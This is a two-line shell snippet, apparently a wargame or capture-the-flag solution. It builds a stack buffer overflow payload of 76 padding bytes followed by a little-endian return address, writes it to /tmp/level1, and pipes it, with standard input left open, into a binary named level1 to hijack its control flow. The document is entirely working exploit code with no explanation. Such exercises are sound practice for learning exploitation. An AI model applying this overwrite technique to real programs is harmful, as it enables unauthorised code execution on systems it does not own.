```shell
python -c "print('a' * 76 + '\x44\x84\x04\x08')" > /tmp/level1
cat /tmp/level1 - | ./level1
```
